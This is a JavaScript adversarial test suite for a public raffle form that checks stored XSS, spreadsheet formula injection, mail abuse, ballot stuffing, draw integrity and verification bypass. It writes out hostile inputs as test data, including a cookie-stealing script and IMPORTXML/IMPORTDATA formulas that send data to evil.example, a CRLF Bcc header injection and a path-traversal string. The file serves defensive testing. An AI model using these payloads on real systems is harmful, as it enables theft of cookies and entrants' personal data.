/**
 * Adversarial tests for the raffle entry path.
 *
 *   node test/test_redteam.js
 *
 * test_raffle.js asks "does this work?". This file asks "what can a hostile
 * entrant make it do?". Everything here goes through the SAME sandbox and the
 * SAME real RaffleCode.gs -- these are attacks on the shipped code, not on a
 * model of it.
 *
 * The form is genuinely public: anonymous access, no Google sign-in, a QR code
 * printed on a table in the street. Anyone who scans it can also read the page
 * source, see the POST shape, and replay it with curl a thousand times. So the
 * threat model is not "a guest makes a typo", it is:
 *
 *   T1  Stored XSS  -- a payload typed into a field executes when TSG later
 *                      views it (the admin status/draw pages render entrant
 *                      names into HTML).
 *   T2  Formula injection -- a payload typed into a field becomes a live
 *                      formula when the entries Sheet is opened, which in
 *                      Sheets can exfiltrate the whole sheet to a third party.
 *   T3  Email abuse -- the request step emails a code to any address given, so
 *                      the endpoint is a free mailer: it can be pointed at a
 *                      victim, and it can burn the account's daily send quota
 *                      and take the raffle (and every other TSG form) down.
 *   T4  Ballot stuffing -- one person entering many times.
 *   T5  Draw integrity -- forcing, repeating or previewing the draw.
 *   T6  Header/protocol injection into the outbound email and the FUB API.
 *   T7  Verification bypass -- entering without ever proving the email.
 */
const { makeSandbox, at, entry, enterFull, J, DURING, BEFORE } = require('./harness');

let fails = 0, passes = 0;
function check(name, cond, detail) {
  if (cond) { passes++; console.log('PASS  ' + name); }
  else { fails++; console.log('FAIL  ' + name + (detail ? '  -- ' + detail : '')); }
}
function section(t) { console.log('\n--- ' + t + ' ---'); }

const req = (s, d, when) => J(at(when || DURING, () =>
  s.raffleHandleSubmission_(Object.assign({ step: 'request' }, d))));

// ---------------------------------------------------------------------------
section('T1  Stored XSS in the pages TSG opens');
// ---------------------------------------------------------------------------
// The admin status page and draw page build HTML by string concatenation from
// the winner's name, phone and email. Those three values came from a public
// text box. The host project deliberately stopped HTML-escaping at ingest
// (Code.gs, "audit fix M1": escaping was corrupting O'Brien on the way into
// FUB), and its comment says escaping belongs at the point of render instead --
// which is exactly here.
{
  const PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '<script>fetch("https://evil.example/"+document.cookie)</script>',
    '"><svg/onload=alert(1)>',
    "<a href='javascript:alert(1)'>click</a>"
  ];
  PAYLOADS.forEach((payload, i) => {
    const s = makeSandbox();
    const name = payload + ' Lastname';        // needs a space to pass the name check
    const r = enterFull(s, entry({ fullName: name, email: 'x' + i + '@mail-test.co',
                                   phone: '(215) 555-81' + (20 + i) }), DURING);
    check('payload ' + i + ' was accepted as an entry (setup)', !!(r && r.ok));

    const drawn = at(DURING, () => s.raffleDrawWinner_(false, true));
    check('payload ' + i + ' draw ran (setup)', !!(drawn && drawn.ok));

    const statusHtml = String(at(DURING, () => s.raffleStatusPage_(false)));
    const drawHtml   = String(at(DURING, () => s.raffleDrawPage_(false, true)));

    // The assertion: the raw payload must NOT survive into the HTML. An escaped
    // copy (&lt;img ...) is fine and is what we want to see instead.
    check('status page does not emit raw payload ' + i,
      statusHtml.indexOf(payload) === -1,
      'raw payload found in admin status HTML');
    check('draw page does not emit raw payload ' + i,
      drawHtml.indexOf(payload) === -1,
      'raw payload found in admin draw HTML');
    // Belt and braces: the admin pages' own markup is div/p/h2/b/br only, so ANY
    // other tag, or any event-handler attribute, could only have come from an
    // entrant. (Checking for the strings "onerror=" or "javascript:" would be
    // wrong here: those appear, correctly escaped and inert, as the visible text
    // of the winner's name.)
    check('status page emits no injected tag or handler attribute ' + i,
      !/<(script|img|svg|iframe|a|object|embed|style)\b/i.test(statusHtml) &&
      !/<[a-z][^>]*\son[a-z]+\s*=/i.test(statusHtml));
    check('draw page emits no injected tag or handler attribute ' + i,
      !/<(script|img|svg|iframe|a|object|embed|style)\b/i.test(drawHtml) &&
      !/<[a-z][^>]*\son[a-z]+\s*=/i.test(drawHtml));
  });

  // Backups are rendered too, from a second and third entrant.
  const s = makeSandbox();
  enterFull(s, entry({ fullName: 'Aaa Bbb', email: 'a@mail-test.co', phone: '(215) 555-8101' }), DURING);
  enterFull(s, entry({ fullName: '<img src=x onerror=alert(2)> Backup',
                       email: 'b@mail-test.co', phone: '(215) 555-8102' }), DURING);
  enterFull(s, entry({ fullName: 'Ccc Ddd', email: 'c@mail-test.co', phone: '(215) 555-8103' }), DURING);
  at(DURING, () => s.raffleDrawWinner_(false, true));
  const html = String(at(DURING, () => s.raffleDrawPage_(false, true)));
  check('backup names are escaped on the draw page',
    html.indexOf('<img src=x onerror=alert(2)>') === -1);
}

// ---------------------------------------------------------------------------
section('T2  Spreadsheet formula injection');
// ---------------------------------------------------------------------------
// appendRow() writes strings into cells. Google Sheets evaluates a cell whose
// text begins with = + - or @ as a FORMULA. IMPORTXML/IMPORTDATA/HYPERLINK in
// such a cell fire when Durand opens the sheet, with his session, and can send
// the contents of neighbouring cells -- every entrant's name, email and phone --
// to an arbitrary URL. This is the classic CSV-injection class and the entries
// sheet is a direct, unreviewed sink for three public text fields.
{
  const ATTACKS = [
    // Each carries enough real digits in the phone to satisfy the NANP check,
    // which is the trick: the junk-phone filter reads digits, not text.
    { label: 'IMPORTXML exfil via name',
      fullName: '=IMPORTXML("https://evil.example/?d="&C2,"//a") Smith',
      email: 'f1@mail-test.co', phone: '(215) 555-8131' },
    { label: 'HYPERLINK phish via name',
      fullName: '=HYPERLINK("https://evil.example","Click") Jones',
      email: 'f2@mail-test.co', phone: '(215) 555-8132' },
    { label: 'formula smuggled in the phone field',
      fullName: 'Real Person',
      email: 'f3@mail-test.co', phone: '=IMPORTDATA("https://evil.example/2155558133")' },
    { label: 'leading + operator',
      fullName: '+1+1 Person', email: 'f4@mail-test.co', phone: '(215) 555-8134' },
    { label: 'leading @ (legacy Lotus/Sheets)',
      fullName: '@SUM(1,1) Person', email: 'f5@mail-test.co', phone: '(215) 555-8135' },
    { label: 'leading - operator',
      fullName: '-2+3 Person', email: 'f6@mail-test.co', phone: '(215) 555-8136' }
  ];
  ATTACKS.forEach(a => {
    const s = makeSandbox();
    enterFull(s, entry({ fullName: a.fullName, email: a.email, phone: a.phone }), DURING);
    const rows = s.__data('Entries');
    if (!rows.length) { check(a.label + ': rejected outright (also acceptable)', true); return; }
    const cells = rows[0].map(String);
    const dangerous = cells.filter(c => /^[=+\-@]/.test(c.trim()));
    check(a.label + ': no cell starts with = + - or @',
      dangerous.length === 0,
      'live formula cell(s): ' + JSON.stringify(dangerous));
  });

  // And the data must still be READABLE -- neutralizing must not mean deleting.
  {
    const s = makeSandbox();
    enterFull(s, entry({ fullName: "=Bad Formula", email: 'f7@mail-test.co',
                         phone: '(215) 555-8137' }), DURING);
    const row = s.__data('Entries')[0];
    check('neutralized value still contains the original text',
      row && String(row[1]).indexOf('Bad Formula') !== -1,
      'got ' + JSON.stringify(row && row[1]));
  }

  // A normal name must be untouched -- no apostrophe litter on O'Brien.
  {
    const s = makeSandbox();
    enterFull(s, entry({ fullName: "Maeve O'Brien", email: 'f8@mail-test.co',
                         phone: '(215) 555-8138' }), DURING);
    const row = s.__data('Entries')[0];
    check("ordinary name is written unchanged (O'Brien)",
      row && row[1] === "Maeve O'Brien", 'got ' + JSON.stringify(row && row[1]));
  }
}

// ---------------------------------------------------------------------------
section('T3  Using the endpoint as a mailer / burning the send quota');
// ---------------------------------------------------------------------------
// Step 1 sends an email to whatever address is posted, before anything is
// verified. That is unavoidable -- it IS the verification email -- but it means
// an attacker can (a) point it at someone else repeatedly, and (b) exhaust the
// Workspace daily send quota (1,500/day), which would stop verification codes,
// stop the Open House form's emails, and stop sendErrorAlert from reporting
// that any of it happened.
//
// The shared checkRateLimit() caps submissions at 15/minute across both forms,
// which bounds the RATE but not the DAILY TOTAL: 15/min sustained is 21,600/day,
// so the quota dies in under two hours. The rate cap is also global, so it
// cannot distinguish "one attacker hammering one victim" from a real queue at
// the table. A per-address cap is the missing control.
{
  const s = makeSandbox();
  const victim = 'victim@mail-test.co';
  let sentToVictim = 0, refusals = 0;
  for (let i = 0; i < 12; i++) {
    const r = req(s, entry({ fullName: 'Attacker Person', email: victim,
                             phone: '(215) 555-8' + (200 + i) }), DURING);
    if (r && r.ok && r.needsCode) sentToVictim++;
    else refusals++;
  }
  const mails = s.__sent.filter(m => m.to === victim).length;
  check('one address cannot be mailed 12 times in a row',
    mails <= 3, 'the endpoint sent ' + mails + ' emails to ' + victim);
  check('the excess requests were refused, not silently dropped',
    refusals > 0, 'every one of the 12 requests was accepted');

  // The cap must be per-address, not a global freeze: a real queue of different
  // people at the table must keep working while one address is being abused.
  const s2 = makeSandbox();
  for (let i = 0; i < 6; i++) {
    req(s2, entry({ fullName: 'Abused Target', email: 'target@mail-test.co',
                    phone: '(215) 555-8' + (300 + i) }), DURING);
  }
  const ok = req(s2, entry({ fullName: 'Honest Guest', email: 'honest@mail-test.co',
                             phone: '(215) 555-8399' }), DURING);
  check('a different, honest entrant is unaffected by another address being capped',
    !!(ok && ok.ok && ok.needsCode), JSON.stringify(ok));
}

// ---------------------------------------------------------------------------
section('T4  Ballot stuffing');
// ---------------------------------------------------------------------------
{
  const s = makeSandbox();
  enterFull(s, entry({ fullName: 'Dana Reid', email: 'dana@mail-test.co',
                       phone: '(215) 555-8123' }), DURING);
  // Same email, different phone.
  const dup1 = req(s, entry({ fullName: 'Dana Reid', email: 'dana@mail-test.co',
                              phone: '(267) 555-9999' }), DURING);
  check('same email + new phone is caught as already entered', !!(dup1 && dup1.already));
  // Same phone, different email.
  const dup2 = req(s, entry({ fullName: 'Dana Reid', email: 'dana2@mail-test.co',
                              phone: '(215) 555-8123' }), DURING);
  check('same phone + new email is caught as already entered', !!(dup2 && dup2.already));
  // Case and formatting games.
  const dup3 = req(s, entry({ fullName: 'dana reid', email: 'DANA@Mail-Test.CO',
                              phone: '2155558123' }), DURING);
  check('case/format variations are caught', !!(dup3 && dup3.already));
  check('only one row exists after four attempts', s.__data('Entries').length === 1,
    'rows=' + s.__data('Entries').length);

  // Gmail's dot and +tag aliases all deliver to ONE inbox, so they are one
  // person for raffle purposes. This is the cheapest stuffing attack there is:
  // it needs no extra phone, no extra inbox, and it survives the email check.
  const g = makeSandbox();
  enterFull(g, entry({ fullName: 'Sam Vance', email: 'sam.vance@gmail.com',
                       phone: '(215) 555-8401' }), DURING);
  const alias1 = req(g, entry({ fullName: 'Sam Vance', email: 'samvance@gmail.com',
                                phone: '(215) 555-8402' }), DURING);
  check('gmail dot-alias is recognised as the same inbox', !!(alias1 && alias1.already),
    JSON.stringify(alias1));
  const alias2 = req(g, entry({ fullName: 'Sam Vance', email: 'sam.vance+party@gmail.com',
                                phone: '(215) 555-8403' }), DURING);
  check('gmail +tag alias is recognised as the same inbox', !!(alias2 && alias2.already),
    JSON.stringify(alias2));

  // A non-Gmail domain must NOT be collapsed the same way -- plenty of hosts
  // treat a dot as a real, distinct address.
  const o = makeSandbox();
  enterFull(o, entry({ fullName: 'Pat Lee', email: 'pat.lee@somecorp.co',
                       phone: '(215) 555-8501' }), DURING);
  const other = req(o, entry({ fullName: 'Pat Lee', email: 'patlee@somecorp.co',
                               phone: '(215) 555-8502' }), DURING);
  check('a dot is NOT stripped on a non-Gmail domain', !(other && other.already),
    'collapsed two distinct non-Gmail addresses into one');
}

// ---------------------------------------------------------------------------
section('T5  Draw integrity');
// ---------------------------------------------------------------------------
{
  // A guest hitting the public form URL must not be able to reach the draw or
  // the entrant list, with a wrong key or none.
  const s = makeSandbox();
  enterFull(s, entry({ fullName: 'Aaa Bbb', email: 'd1@mail-test.co',
                       phone: '(215) 555-8601' }), DURING);
  const noKey   = String(at(DURING, () => s.raffleServeForm_({ parameter: { action: 'draw' } }, 'u')));
  const badKey  = String(at(DURING, () => s.raffleServeForm_({ parameter: { action: 'draw', key: 'guess' } }, 'u')));
  const noKeyS  = String(at(DURING, () => s.raffleServeForm_({ parameter: { action: 'status' } }, 'u')));
  check('draw with no key is refused', /Not found/.test(noKey));
  check('draw with a wrong key is refused', /Not found/.test(badKey));
  check('status with no key is refused', /Not found/.test(noKeyS));
  check('a refused draw did not actually draw', s.__props.RAFFLE_WINNER_JSON === undefined);
  check('wrong key and no key give byte-identical responses', noKey === badKey);

  // A live draw before entries close must take two asks: it is irreversible, and
  // an accidental bookmark tap at 4pm would lock in a winner from a near-empty
  // sheet with an hour of entries still to come.
  const g = makeSandbox();
  enterFull(g, entry({ fullName: 'Early Bird', email: 'early@mail-test.co',
                       phone: '(215) 555-8602' }), DURING);
  const early = at(DURING, () => g.raffleDrawWinner_(false));
  check('an unforced live draw before the close time is refused',
    !(early && early.ok), JSON.stringify(early));
  check('the refused early draw stored no winner', g.__props.RAFFLE_WINNER_JSON === undefined);
  const forced = at(DURING, () => g.raffleDrawWinner_(false, true));
  check('an explicitly forced early draw still works', !!(forced && forced.ok));
  // Reaching it through the admin URL requires the key AND the extra flag.
  const noForce = String(at(DURING, () => makeSandbox().raffleServeForm_(
    { parameter: { action: 'draw', key: 'k' } }, 'u')));
  check('the admin draw URL without a key is still refused', /Not found/.test(noForce));

  // The draw is once-only: a second call returns the same winner, never a new one.
  const s2 = makeSandbox();
  ['a', 'b', 'c', 'd'].forEach((c, i) => enterFull(s2, entry({
    fullName: 'Guest ' + c.toUpperCase() + ' Person', email: c + '@mail-test.co',
    phone: '(215) 555-87' + (10 + i) }), DURING));
  const first  = at(DURING, () => s2.raffleDrawWinner_(false, true));
  const second = at(DURING, () => s2.raffleDrawWinner_(false, true));
  check('re-drawing returns the identical winner',
    first.ok && second.ok && first.result.winner.email === second.result.winner.email);
  check('re-draw is flagged as already drawn', !!second.alreadyDrawn);

  // Test mode must never be able to touch the live draw or the live sheet.
  const t = makeSandbox({ qaMode: true });
  at(BEFORE, () => t.raffleHandleSubmission_(Object.assign({ step: 'request' },
    entry({ fullName: 'Qa Tester', email: 'qa@mail-test.co', phone: '(215) 555-8888' }))));
  check('a test-mode entry never lands on the live tab', t.__data('Entries').length === 0);
  check('test mode does not set the live winner property',
    t.__props.RAFFLE_WINNER_JSON === undefined);
}

// ---------------------------------------------------------------------------
section('T6  Header and protocol injection');
// ---------------------------------------------------------------------------
{
  // CRLF in a name would, in a naive mailer, let an attacker add Bcc: headers
  // to the winner email that goes to Durand and Ryan.
  const s = makeSandbox();
  enterFull(s, entry({ fullName: 'Eve\r\nBcc: attacker@evil.example\r\n Adams',
                       email: 'crlf@mail-test.co', phone: '(215) 555-8701' }), DURING);
  at(DURING, () => s.raffleDrawWinner_(false, true));
  const winMail = s.__sent.filter(m => /Winner/i.test(m.subject)).pop();
  check('a draw email was produced (setup)', !!winMail);
  check('no CR/LF survives into the email subject',
    !!winMail && !/[\r\n]/.test(String(winMail.subject)),
    JSON.stringify(winMail && winMail.subject));
  check('the recipient list is not attacker-influenced',
    !!winMail && String(winMail.to).indexOf('attacker@evil.example') === -1);

  // Same for the phone field, which is stored raw (only its digits are checked).
  const p = makeSandbox();
  enterFull(p, entry({ fullName: 'Raw Phone', email: 'rawphone@mail-test.co',
                       phone: '(215) 555-8702\r\nBcc: attacker@evil.example' }), DURING);
  const row = p.__data('Entries')[0];
  check('no CR/LF is stored in the phone cell',
    !row || !/[\r\n]/.test(String(row[3])), JSON.stringify(row && row[3]));

  // The FUB note must stay plain text -- if isHtml ever flipped, every note
  // body would render entrant-controlled markup inside the CRM.
  const f = makeSandbox();
  enterFull(f, entry({ fullName: '<b>Bold</b> Person', email: 'fub@mail-test.co',
                       phone: '(215) 555-8703' }), DURING);
  const note = f.__fetches.find(x => /\/v1\/notes/.test(x.url));
  check('a FUB note was posted (setup)', !!note);
  check('FUB notes are posted as plain text, not HTML',
    !!note && JSON.parse(note.o.payload).isHtml === false);
}

// ---------------------------------------------------------------------------
section('T7  Verification bypass');
// ---------------------------------------------------------------------------
{
  // Posting step=verify directly, with no prior request, must write nothing.
  const s = makeSandbox();
  const forged = J(at(DURING, () => s.raffleHandleSubmission_({
    step: 'verify', vid: '11111111-1111-4111-8111-111111111111', code: '123456' })));
  check('a forged verify with an unknown vid is refused', !(forged && forged.ok));
  check('a forged verify wrote no row', s.__data('Entries').length === 0);

  // A vid that is not a UUID must not even reach the cache.
  ['', 'x', '../../etc/passwd', '{}', 'a'.repeat(200)].forEach((bad, i) => {
    const r = J(at(DURING, () => s.raffleHandleSubmission_({
      step: 'verify', vid: bad, code: '123456' })));
    check('malformed vid ' + i + ' is refused', !(r && r.ok));
  });

  // Brute force: 6 digits, 5 attempts. After the cap the pending entry is gone.
  const b = makeSandbox();
  const r1 = req(b, entry({ fullName: 'Brute Force', email: 'brute@mail-test.co',
                            phone: '(215) 555-8801' }), DURING);
  const realCode = String(b.__sent[b.__sent.length - 1].subject).match(/(\d{6})/)[1];
  let accepted = 0;
  for (let i = 0; i < 8; i++) {
    const guess = String((Number(realCode) + i + 1) % 1000000).padStart(6, '0');
    const r = J(at(DURING, () => b.raffleHandleSubmission_({
      step: 'verify', vid: r1.vid, code: guess })));
    if (r && r.ok) accepted++;
  }
  check('no wrong code was ever accepted', accepted === 0);
  const afterCap = J(at(DURING, () => b.raffleHandleSubmission_({
    step: 'verify', vid: r1.vid, code: realCode })));
  check('the REAL code is dead after the attempt cap is hit', !(afterCap && afterCap.ok));
  check('brute force wrote no row', b.__data('Entries').length === 0);

  // The entry must be written from the cached values, not from whatever the
  // second request carries -- otherwise verify someone else's address, enter
  // your own.
  const v = makeSandbox();
  const vr = req(v, entry({ fullName: 'Real Name', email: 'real@mail-test.co',
                            phone: '(215) 555-8802' }), DURING);
  const code = String(v.__sent[v.__sent.length - 1].subject).match(/(\d{6})/)[1];
  at(DURING, () => v.raffleHandleSubmission_({
    step: 'verify', vid: vr.vid, code: code,
    fullName: 'Swapped Name', email: 'swapped@mail-test.co', phone: '(267) 555-0000' }));
  const w = v.__data('Entries')[0];
  check('the verified (cached) email is written, not the one re-posted',
    !!w && w[2] === 'real@mail-test.co', JSON.stringify(w && w[2]));
  check('the verified (cached) name is written',
    !!w && w[1] === 'Real Name', JSON.stringify(w && w[1]));

  // Consent cannot be skipped, spoofed as a truthy non-'Yes', or omitted.
  ['no', '', 'true', '1', 'YES ', undefined].forEach((c, i) => {
    const cs = makeSandbox();
    const r = req(cs, { fullName: 'No Consent', email: 'nc' + i + '@mail-test.co',
                        phone: '(215) 555-89' + (10 + i), consent: c }, DURING);
    check('consent value ' + JSON.stringify(c) + ' is refused', !(r && r.ok));
  });
}

console.log('\n' + passes + ' passed, ' + fails + ' failed');
process.exit(fails ? 1 : 0);
